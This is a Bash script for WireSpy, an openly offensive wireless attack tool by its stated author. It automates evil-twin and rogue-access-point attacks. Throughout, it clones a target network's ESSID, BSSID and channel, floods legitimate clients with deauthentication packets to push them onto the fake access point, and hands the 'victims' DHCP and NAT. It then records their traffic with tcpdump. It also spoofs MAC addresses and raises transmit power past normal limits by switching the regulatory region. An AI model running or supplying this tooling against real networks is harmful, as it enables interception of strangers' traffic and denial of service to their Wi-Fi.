#!/usr/bin/env bash
#
#    Copyright (C) 2015 - 2018 Alexandre Teyar
#
# Licensed under the Apache License, SCRIPT_VERSION 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
#    limitations under the License.

# TODO:
# * implement a nice coloring scheme
# * fix the bug start new attack

# enable stricter programming rules (turns some bugs into errors)
set -Eeuo pipefail

declare -gr  PROGNAME=$(basename $0)
declare -gr  PROGBASENAME=${PROGNAME%%.*}
declare -gr  PROGDIR=$(dirname ${BASH_SOURCE[0]})
declare -gr  PROGVERSION=0.6
declare -gr  BRANCH='master'
declare -gar REQUIRED_PACKAGES=( # comment this variable out if experiencing any issue with the dependencies checks
    'aircrack-ng'
    'coreutils'
    'git'
    'grep'
    'isc-dhcp-server'
    'macchanger'
    'procps'
    'rfkill'
    'iproute2'
    'iw'
    'tcpdump'
    'xterm'
)

declare -gr AIRBASE_ERROR='An error occurred with airbase-ng, no tap interface was created'
declare -gr AP_PREREQUISITE='To use this option, first configure a honeypot or an eviltwin'
declare -gr EVILTWIN_INFO="""This attack consists of creating an evil copy of an access point and repeatedly sending deauth packets \
to its clients to force them to connect to our evil copy.
Consequently, choose the same ESSID, BSSID and wireless channel as the targeted access point.
To properly perform this attack the attacker should first scan all the in-range access points to select a \
target. Next step is to copy the BSSID, ESSID and channel of the selected target access point, to create its twin. 
The final step is to deauthenticate all the clients from the target access point, so that the victims may connect \
to the evil twin."""

declare -gi isHoneypot=0
declare -gi isEviltwin=0
declare -gi isSniffing=0

declare -g INTF=''
declare -g MINTF=''
declare -g TINTF=''
declare -g WINTF=''

declare -gi PID_AIREPLAY=''
declare -gi PID_AIRODUMP=''
declare -gi PID_TCPDUMP=''
declare -gi PID_AIRBASE=''

declare -g  PROMPT="$PROGBASENAME »"
declare -gr PS3="$(echo -e $PROMPT) "

print()         { printf "%s » %s\n" "$PROGBASENAME" "$1"; }
print_error()   { printf "%s > %-8.8s » %s\n" "$PROGBASENAME" "error" "$1"; }
print_info()    { printf "%s > %-8.8s » %s\n" "$PROGBASENAME" "information" "$1"; }
print_intf()    { printf "%s > %-8.8s » %s\n" "$PROGBASENAME" "interface" "$1"; }
print_status()  { printf "%s > %-8.8s » %s\n" "$PROGBASENAME" "status" "$1"; }
print_warning() { printf "%s > %-8.8s » %s\n" "$PROGBASENAME" "warning" "$1"; }
print_hp()      { printf "%s > %-8.8s » %s\n" "$PROGBASENAME" "honeypot" "$1"; }
print_et()      { printf "%s > %-8.8s » %s\n" "$PROGBASENAME" "eviltwin" "$1"; }
print_pu()      { printf "%s > %-8.8s » %s\n" "$PROGBASENAME" "powerup" "$1"; }

trap quit INT

function quit() {
    clean_up
    exit 130
}

function banner() {
cat <<- BANNER
${PROGBASENAME^} v$PROGVERSION (type 'help' for a list of commands)
Author: Alexandre Teyar | LinkedIn: linkedin.com/in/alexandre-teyar | GitHub: github.com/AresS31

BANNER
}

function check_update() {
    print 'Checking for an update...'

    if [[ $(git rev-parse --is-inside-work-tree 2> /dev/null) ]]
    then
        if [[ $(git diff --name-only origin/$BRANCH -- ${0}) ]]
        then
            print 'A new version is available, consider updating using the command: git reset --hard && git pull origin $BRANCH --rebase'
        else
            print 'This is the latest stable version'
        fi
    else
        print_warning "It is recommended to fetch $0 on GitHub using the command: git clone https://github.com/AresS31/wirespy"
    fi
}

function check_compatibility() {
    local -i var=0
    
    print 'Bash version check...'
    if ((BASH_VERSINFO[0] < 4))
    then 
        var=1
        print_error "A minimum of bash version 4.0 is required. Upgrade your version with: sudo apt-get install --only-upgrade bash"
    else
        print 'The bash minimum version requirement is satisfied'
    fi

    print 'Dependencies check...'
    for package in ${REQUIRED_PACKAGES[@]}
    do
        if [[ $(dpkg -s $package 2> /dev/null) ]]
        then
            continue
        else
            var=1
            print_error "The $package package is missing. Install it with: sudo apt-get install $package -y"
        fi
    done

    if [[ $var = 1 ]]
    then
        exit 1
    fi

    print "All of the required packages are already installed"
    echo '' # add new line
}

function usage {

cat <<- USAGE
Modules:
    eviltwin      > launch an evil-twin attack
    honeypot      > launch a rogue access point attack
    powerup       > power wireless interface up
    leases        > display DHCP leases
    start capture > start packet capture (tcpdump)
    stop capture  > stop packet capture (tcpdump)
Commands:
    status        > show modules status
    iw_scan       > show all wireless access points nearby
    clear         > clear the terminal
    help          > list available commands
    quit|exit     > exit the program
USAGE
}

function menu() {
    while :
    do
        read -p  "$(echo -e $PROMPT) "

        case $REPLY in
            'status')
                local honeypot_status='not running'
                local eviltwin_status='not running'
                local tcpdump_status='not running'

                if [[ $isEviltwin = 1 ]]
                then
                    eviltwin_status='running...'
                fi
                if [[ $isHoneypot = 1 ]]
                then
                    honeypot_status='running...'
                fi
                if [[ $isSniffing = 1 ]]
                then
                    tcpdump_status='running...'
                fi

cat <<- STATUS
Modules status:
    eviltwin       > $eviltwin_status
    honeypot       > $honeypot_status
    packet capture > $tcpdump_status
STATUS
                ;;
            'clear')
                clear
                ;;
            'quit'|'exit')
                quit
                ;;
            'help')
                usage
                ;;
            'eviltwin')
                if [[ $isHoneypot = 1 || $isEviltwin = 1 ]]
                then
                    print_warning "An access-point (honeypot|evil-twin) is currently running. Do you wish to stop it to start an evil-twin attack?"
                    select option in 'yes' 'no' 'quit'
                    do
                        case $option in
                            'yes') 
                                print_info "Stopping the running attack..."
                                clean_up &> /dev/null
                                configure_intfs
                                eviltwin
                                isHoneypot=0
                                isEviltwin=1
                                break
                                ;;
                            'no')
                                break
                                ;;
                            'quit')
                                quit
                                ;;
                        esac
                    done
                else
                    configure_intfs
                    eviltwin
                    isEviltwin=1
                fi
                ;;
            'honeypot')
                if [[ $isHoneypot = 1 || $isEviltwin = 1 ]]
                then
                    print_warning "An access-point (honeypot || evil-twin) is currently running. Do you wish to stop it to start an evil-twin attack?"
                    select option in 'yes' 'no' 'quit'
                    do
                        case $option in
                            'yes') 
                                print_info "Stopping the running attack..."
                                clean_up &> /dev/null
                                configure_intfs
                                honeypot
                                isHoneypot=1
                                isEviltwin=0
                                break
                                ;;
                            'no')
                                break
                                ;;
                            'quit')
                                quit
                                ;;
                        esac
                    done
                else
                    configure_intfs
                    honeypot
                    isHoneypot=1
                fi
                ;;
            'powerup')
                powerup
                ;;
            'iw_scan')
                local -a WINTERFACES

                print 'Select the wireless interface to use:'
                get_wintfs WINTERFACES
                select option in "${WINTERFACES[@]}" 'quit'
                do
                    case $option in
                        'quit')
                            quit
                            ;;
                        *)
                            if [[ $option ]]
                            then
                                local WINTF=$(echo "$option" | awk -F': ' '{print $1}')
                                iw_scan $WINTF
                                break
                            fi
                            ;;
                    esac
                done
                ;;
            'lease'|'leases')
                if [[ $isHoneypot = 0 && $isEviltwin = 0 ]]
                then
                    print_warning "$AP_PREREQUISITE"
                else
                    if [[ $(cat /var/run/dhcpd.pid) ]]
                    then
                        cat /var/lib/dhcp/dhcpd.leases
                    else
                        print_warning 'The DHCP server has not been started'
                    fi
                fi
                ;;
            'start capture')
                if [[ $isHoneypot = 0 && $isEviltwin = 0 ]]
                then
                    print_warning "$AP_PREREQUISITE"
                else
                    if [[ $isSniffing = 0 ]]
                    then
                        print_info "Packet capture started, the resulting file will be ${PROGDIR}/logs/capture_$(/bin/date +"%Y%m%d-%H%M%S").pcap"
                        # we want to keep the stderr in case of problem
                        PID_TCPDUMP=$(tcpdump -i $TINTF -w ${PROGDIR}/logs/capture_$(/bin/date +"%Y%m%d-%H%M%S").pcap 1> /dev/null & echo $!)
                        isSniffing=1
                    else
                        print_warning 'The traffic is already being captured'
                    fi
                fi
                ;;
            'stop capture')
                if [[ $isHoneypot = 0 && $isEviltwin = 0 ]]
                then
                    print_warning "$AP_PREREQUISITE"
                else
                    if [[ $isSniffing = 1 ]]
                    then
                        print_info "Packet capture stopped"
                        kill -SIGKILL "$PID_TCPDUMP"
                        isSniffing=0
                    else
                        print_warning 'No packet capture has been launched'
                    fi
                fi
                ;;
            *)
                print_warning "Invalid command: ${REPLY}. Type help for the list of available commands"
                ;;
        esac
    done
}

function configure_intfs() {
    local -a INTERFACES
    local -a WINTERFACES

    print 'Select the Internet-facing interface:'
    get_intfs INTERFACES
    select option in "${INTERFACES[@]}" 'quit'
    do
        case $option in
          'quit')
                quit
                ;;
            *)
                if [[ $option ]]
                then
                    INTF=$(echo "$option" | awk -F': ' '{print $1}')
                    break
                fi
                ;;
        esac
    done

    print "Do you wish to randomise $INTF MAC address (this option can cause problems)?"
    select option in 'yes' 'no' 'quit'
    do
        case $option in
            'yes') 
                print_info "Randomising $INTF MAC address..."
                ip link set $INTF down && macchanger -A $INTF && ip link set $INTF up
                print_warning 'In case of problems, RESTART networking (/etc/init.d/network restart), or use wicd (wicd-client)'
                break
                ;;
            'no') 
                break
                ;;
            'quit')
                quit
                ;;
        esac
    done

    print 'Select the wireless interface to use:'
    get_wintfs WINTERFACES
    select option in "${WINTERFACES[@]}" 'quit'
    do
        case $option in
            'quit')
                quit
                ;;
            *)
                if [[ $option ]]
                then
                    WINTF=$(echo "$option" | awk -F': ' '{print $1}')

                    if [[ $WINTF = $INTF ]]
                    then
                        print_warning "$WINTF is already in use, select another interface"
                    else
                        break
                    fi
                fi
                ;;
        esac
    done

    # prevent wlan adapter soft blocking
    rfkill unblock wifi

    # put the wireless interface into "monitor" mode
    # add a check to ensure monitor mode has started or exit the script
    print_info "Starting monitor mode on $WINTF..."
    iw dev $WINTF set type monitor
    sleep 2 # necessary to let WINTF come up before macchanging

    if [[ $? = 0 ]]
    then
        print_info "Monitor mode started"
    else
        print_error "$WINTF could not enter monitor mode, inspect this issue manually"
        exit 1
    fi
    MINTF=$WINTF

    print "Do you wish to randomise $MINTF MAC address (this option is recommended)?"
    select option in 'yes' 'no' 'quit'
    do
        case $option in
            'yes') 
                print_info "Randomising $MINTF MAC address..."
                ip link set $MINTF down && macchanger -A $MINTF && ip link set $MINTF up
                break
                ;;
            'no')
                break
                ;;
            'quit')
                quit
                ;;
        esac
    done

    print_info "Killing processes that may interfere with the honeypot || evil-twin..."
    airmon-ng check kill

    sleep 5
}

function honeypot() {
    local -ar options=(
        "Blackhole: The access point type will respond to all probe requests (the access point may receive a lot \
of requests in areas with high levels of WiFi activity such as crowded public places)."
        'Bullzeye: The access point type will respond only to the probe requests specifying the access point ESSID.'
        'quit'
    )


    print_hp 'Select the type of honeypot you want to set up:'
    select option in "${options[@]}"
    do
        case $REPLY in
            1) 
                local -ir attack_type=1
                break
                ;;
            2) 
                local -ir attack_type=2
                break
                ;;
            3)
                quit
                ;;
        esac
    done

    print_hp 'Enter the honeypot ESSID:'
    read -p "$(echo -e $PROMPT) " ESSID

    print_hp 'Enter the honeypot wireless channel (value must be between 1 and 12):'
    while :
    do
        read -p  "$(echo -e $PROMPT) "
        
        case $REPLY in 
            [1-9]|1[0-2])
                local -i WCHAN=$REPLY
                break
                ;;
            *) 
                print_warning "Invalid channel: $REPLY"
                ;;
        esac
    done

    print_hp 'Do you want to enable WEP authentication?'
    select option in 'yes' 'no' 'quit'
    do
        case $option in
            'yes') 
                print_hp 'Enter a WEP password (the value must be 10 hexadecimal characters):'
                read -p "$(echo -e $PROMPT) " WEP 

                case $attack_type in
                    1)
                        xterm -fg green -title "Blackhole - $ESSID" -e "airbase-ng -w $WEP -c $WCHAN -e $ESSID -P -C 60 $MINTF -v | tee ${PROGDIR}/config/tmp.txt 2> /dev/null" &
                        PID_AIRBASE=$!
                        ;;
                    2)
                        xterm -fg green -title "Bullzeye - $ESSID" -e "airbase-ng -w $WEP -c $WCHAN -e $ESSID $MINTF -v | tee ${PROGDIR}/config/tmp.txt 2> /dev/null" &
                        PID_AIRBASE=$!
                        ;;
                esac
                break
                ;;
            'no') 
                case $attack_type in
                    1)
                        xterm -fg green -title "Blackhole - $ESSID" -e "airbase-ng -c $WCHAN -e $ESSID -P $MINTF -v | tee ${PROGDIR}/config/tmp.txt 2> /dev/null" &
                        PID_AIRBASE=$!
                        ;;
                    2)
                        xterm -fg green -title "Bullzeye - $ESSID" -e "airbase-ng -c $WCHAN -e $ESSID $MINTF -v | tee ${PROGDIR}/config/tmp.txt 2> /dev/null" &
                        PID_AIRBASE=$!
                        ;;  
                esac
                break
                ;;
            'quit')
                quit
                ;;
        esac
    done

    sleep 4 # necessary to let TINTF come up before setting it up

    # extracting the tap interface
    TINTF=$(grep 'Created tap interface' ${PROGDIR}/config/tmp.txt | awk '{print $5}')
    if [[ $TINTF =~ "at[0-9]+" ]]
    then
        print_error "$AIRBASE_ERROR"
        quit
    fi

    enable_internet
    
    print_info "The honeypot $ESSID is now running..."
    sleep 6
}

function eviltwin() {
     iw dev $MINTF set type managed && iw_scan $MINTF && iw dev $MINTF set type managed
    
    echo'' # add new line
    echo "$EVILTWIN_INFO"

    print_et 'Enter the evil-twin ESSID (the value must be identical to the legitimate access-point to spoof):'
    read -p "$(echo -e $PROMPT) " eviltwin_ESSID

    print_et 'Enter the evil-twin BSSID (the value must be identical to the legitimate access-point to spoof):'
    read -p "$(echo -e $PROMPT) " eviltwin_BSSID

    print_et 'Enter the wireless channel to use (the value must be identical to the legitimate access-point to spoof):'
    while :
    do
        read -p  "$(echo -e $PROMPT) "
        
        case $REPLY in 
            [1-9]|1[0-2])
                local -i WCHAN=$REPLY
                break
                ;;
            *) 
                print_warning "Invalid channel: $REPLY"
                ;;
        esac
    done

    xterm -fg green -title "Evil-twin - $eviltwin_ESSID" -e "airbase-ng -c $WCHAN -e $eviltwin_ESSID -P $MINTF -v | tee ${PROGDIR}/config/tmp.txt 2> /dev/null" &
    PID_AIRBASE=$!
    sleep 4 # necessary to let TINTF come up before setting it up

    # extracting the tap interface
    TINTF=$(grep 'Created tap interface' ${PROGDIR}/config/tmp.txt | awk '{print $5}')
    if [[ $TINTF = '' ]]
    then
        print_error "$AIRBASE_ERROR"
        quit
    fi

    # de-auth the legit connected users
    xterm -fg green -title "aireplay-ng - $eviltwin_ESSID" -e "aireplay-ng --ignore-negative-one --deauth 0 -a $eviltwin_BSSID -e eviltwin_ESSID $MINTF" &
    PID_AIREPLAY=$!
    sleep 4

    enable_internet
    
    print_info "The eviltwin $eviltwin_ESSID is now running..."
    sleep 6
}

function powerup() {
    local -a WINTERFACES

    print_pu 'Select the wireless interface to boost-up:'
    get_wintfs vars
    select option in "${WINTERFACES[@]}"
    do
        case $option in
            'quit')
                quit
                ;;
            *)
                if [[ $option ]]
                then
                    local WINTF=$(echo "$option" | awk -F': ' '{print $1}')
                    break
                fi
                ;;
        esac
    done

    print_pu "Enter the power boost (the value must be up to to 4000) to apply to ${WINTF}:"
    while :
    do
        read -p  "$(echo -e $PROMPT) "
        
        if [[ $REPLY -ge 0 ]] && [[ $REPLY -le 4000 ]]
        then
            local -i BOOST=$REPLY
            break
        else
            print_warning "Invalid value: $REPLY"
        fi
    done

    print_info "$WINTF powering up..."
    # Bolivia allows high power levels
    ip link set $WINTF down && iw reg set BO && iw dev $WINTF set txpower fixed $BOOST && ip link set $WINTF up
    sleep 4
    iw dev $WINTF info
}

function get_intfs() {
    local -n _INTERFACES=$1 # referenced copy of the array passed to the function
    local intfs=$(ip -o link show | awk -F': ' '{print $2}' | grep -v 'lo')

    if [[ $intfs ]]
    then
        _INTERFACES=()

        for intf in $intfs
        do # get the network interfaces names
            IP=$(ip -o -f inet add show "$intf" | awk '{print $4}')
            MAC=$(ip link show "$intf" | awk '/ether/ {print $2}')
            _INTERFACES+=("${intf}: $IP $MAC")
        done
    else
        print_error 'No networking interface detected'
        exit 1
    fi
}

function get_wintfs() {
    local -n _WINTERFACES=$1 # referenced copy of the array passed to the function
    local wintfs=$(ip -o link show | awk -F': ' '{print $2}' | egrep 'wlan[[:digit:]]+')

    if [[ $wintfs ]]
    then
        _WINTERFACES=()

        for wintf in $wintfs
        do # get the interfaces names
            IP=$(ip -o -f inet add show "$wintf" | awk '{print $4}')
            MAC=$(ip link show "$wintf" | awk '/ether/ {print $2}')
            _WINTERFACES+=("${wintf}: $IP $MAC")
        done
    else
        print_error 'No wireless interface detected'
        exit 1
    fi
}

function enable_internet() {
    # configuring the newly created tap intrface
    ip addr flush dev $TINTF
    ip link set $TINTF down && ip addr add 10.0.0.254/24 dev $TINTF && ip link set $TINTF up
    ip route flush dev $TINTF
    ip route add 10.0.0.0/24 via 10.0.0.254 dev $TINTF

    print_info 'Enabling IP forwarding'
    echo 1 > /proc/sys/net/ipv4/ip_forward
    # setting up ip address and route

    print_info 'Configuring NAT iptables...'
    # cleaning the mess
    iptables --flush
    iptables --table nat --flush
    iptables --delete-chain
    iptables --table nat --delete-chain
    # iptables rules
    iptables -P FORWARD ACCEPT
    # forward the traffic via the internet facing interface
    iptables -t nat -A POSTROUTING -o $INTF -j MASQUERADE

    # reset any pre-existing dhcp leases
    print_info 'Resetting pre-existing DHCP leases'
    cat /dev/null > '/var/lib/dhcp/dhcpd.leases'
    cat /dev/null > '/tmp/dhcpd.conf'

    # copy the conf file for the DHCP serv and change the isc-dhcp-server settings
    print_info 'Backing up /etc/dhcp/dhcpd.conf, /etc/default/isc-dhcp-server and importing the new configurations'
    cp --backup "${PROGDIR}/config/dhcpd.conf" '/etc/dhcp/dhcpd.conf'
    sed -i.bak -e "s/INTERFACESv4=.*/INTERFACESv4=\"${TINTF}\"/" '/etc/default/isc-dhcp-server'

    # starting the DHCP service
    print_info 'Starting DHCP server to provide the victims with internet access...'
    /etc/init.d/isc-dhcp-server start 
    sleep 4
}

function iw_scan() {
    result=$(iw dev $1 info | grep "monitor")

    if [[ $result ]]
    then
        print_warning "$1 is in monitor mode. Switch the interface $1 to managed mode (this will kill any running honeypot|eviltwin) by typing the following command in a different terminal: sudo iw dev $1 set type managed"
    else
        iw $1 scan | sed -e 's#(on wlan# (on wlan#g' | awk -f "${PROGDIR}/config/iw_parsing.awk"
    fi
}

function clean_up() {
    if [[ $isHoneypot = 1 || $isEviltwin = 1 ]]
    then
        print_info 'Terminating active processes...'
        if [[ $PID_AIRBASE ]]
        then
            kill -SIGKILL $PID_AIRBASE 
        fi
        if [[ $PID_AIREPLAY ]]
        then
            kill -SIGKILL $PID_AIREPLAY
        fi
        sleep 2
    
        print_info 'Removing temporary files'
        rm -f "${PROGDIR}/config/tmp.txt"

        print_info 'Disabling IP forwarding'
        echo 0 > /proc/sys/net/ipv4/ip_forward

        print_info 'Flushing iptables'
        iptables --flush
        iptables --table nat --flush
        iptables --delete-chain
        iptables --table nat --delete-chain

        print_info 'Restoring /etc/dhcp/dhcpd.conf and /etc/default/isc-dhcp-server original configurations'
        mv '/etc/dhcp/dhcpd.conf~' '/etc/dhcp/dhcpd.conf'
        mv '/etc/default/isc-dhcp-server.bak' '/etc/default/isc-dhcp-server'

        print_info 'Stopping DHCP server...'
        /etc/init.d/isc-dhcp-server stop
    fi
    if [[ $MINTF != '' ]]
    then
        print_info "Starting managed mode on $MINTF..." 
        iw dev $MINTF set type managed
        sleep 2

        if [[ $? = 0 ]]
        then
            print_info 'Managed mode started'
        else
            print_error "$MINTF could not enter managed mode, inspect this issue manually"
        fi
    fi
    if [[ $isSniffing = 1 ]]
    then
        print_info 'Terminating TCPDump...'
        kill -SIGKILL $PID_TCPDUMP
        sleep 4
    fi
}

# ensure that the script is running with root privileges
# this step is necessary since WireSpy needs to be perform network changes
if [[ $EUID -ne 0 ]]
then
    print_error "You must run this script as as root using the command: sudo bash ${0}"
    exit 1
fi

banner
check_update
check_compatibility
menu
